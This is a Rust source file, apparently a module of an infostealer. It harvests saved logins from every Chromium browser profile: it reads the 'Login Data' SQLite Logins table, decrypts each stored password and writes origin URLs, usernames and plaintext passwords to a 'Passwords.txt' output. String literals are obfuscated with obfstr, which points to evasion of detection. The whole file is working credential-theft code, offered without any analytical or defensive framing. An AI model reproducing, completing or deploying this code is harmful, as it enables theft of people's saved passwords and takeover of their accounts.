use crate::chromium::{decrypt_data, BrowserData};
use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, Password};
use alloc::borrow::ToOwned;
use alloc::sync::Arc;
use alloc::vec::Vec;
use database::TableRecord;
use obfstr::obfstr as s;
use tasks::{parent_name, Task};
use utils::path::Path;

const LOGINS_ORIGIN_URL: usize = 0;
const LOGINS_USERNAME_VALUE: usize = 3;
const LOGINS_PASSWORD_VALUE: usize = 5;

pub(super) struct PasswordsTask {
    browser: Arc<BrowserData>
}

impl PasswordsTask {
    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
        Self { browser }
    }
}

impl Task for PasswordsTask {
    parent_name!("Passwords.txt");

    unsafe fn run(&self, parent: &Path) {
        let Some(passwords) = collect_from_all_profiles(
            &self.browser.profiles,
            |profile| read_passwords(profile, &self.browser)
        ) else {
            return
        };

        let _ = to_string_and_write_all(&passwords, "\n\n", parent);
    }
}

fn read_passwords(profile: &Path, browser_data: &BrowserData) -> Option<Vec<Password>> {
    let login_data = profile / s!("Login Data");
    
    read_sqlite3_and_map_records(
        &login_data,
        s!("Logins"),
        |record| extract_password_from_record(record, browser_data)
    )
}

fn extract_password_from_record(record: &dyn TableRecord, browser_data: &BrowserData) -> Option<Password> {
    let origin = record
        .get_value(LOGINS_ORIGIN_URL)
        .and_then(|value| value.as_string())
        .map(|s| s.to_owned());

    let username = record
        .get_value(LOGINS_USERNAME_VALUE)
        .and_then(|value| value.as_string())
        .map(|s| s.to_owned());

    let password = record
        .get_value(LOGINS_PASSWORD_VALUE)
        .and_then(|value| value.as_blob())
        .and_then(|blob| unsafe { decrypt_data(blob, browser_data) });

    if let (None, None) = (&username, &password) {
        return None
    }

    Some(Password {
        origin,
        username,
        password
    })
}